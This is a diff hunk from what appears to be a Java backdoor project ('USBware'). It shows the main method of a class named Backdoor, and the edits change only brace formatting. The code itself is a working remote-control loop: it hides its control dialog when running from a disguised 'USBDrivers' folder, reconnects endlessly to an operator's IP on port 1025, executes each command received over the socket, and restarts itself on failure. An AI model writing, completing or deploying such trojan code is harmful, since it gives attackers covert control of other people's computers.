@@ -32,46 +32,46 @@ public class Backdoor {
 	 * @param args
 	 */
 	public static void main(String[] args) {
-		if(args.length==0) {
+		if(args.length==0){
 			String disp=null;
-			try {
+			try{
 				new File("gathered").mkdir();
 				ip=getIP();
 				disp="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
-			}catch (Exception e) {
+			}catch(Exception e){
 				disp="An error occurred:\n"+e.getMessage();
-			}finally {
+			}finally{
 				if(!System.getProperty("user.dir").equals("C:\\ProgramData\\USBDrivers"))
 					JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
 				if(disp.contains("An error occurred"))
 					System.exit(0);
 			}
 		}
-		try {
+		try{
 			while(true)
-				try {
+				try{
 					socket=new Socket(ip, 1025);
 					break;
-				}catch (Exception e) {
+				}catch(Exception e){
 					Thread.sleep(3000);
 					continue;
 				}
 			in=new Scanner(socket.getInputStream());
 			out=new PrintWriter(socket.getOutputStream(), true);
-			while(true) {
+			while(true){
 				String command=in.nextLine();
 				HandleCommand.handle(command);
 			}
-		}catch (Exception e) {
-			try {
+		}catch(Exception e){
+			try{
 				if(socket!=null)
 					socket.close();
 				if(in!=null)
 					in.close();
 				if(out!=null)
 					out.close();
-				main(new String[] {""});
-			}catch (Exception e1) {}
+				main(new String[]{""});
+			}catch(Exception e1){}
 		}
 	}
 
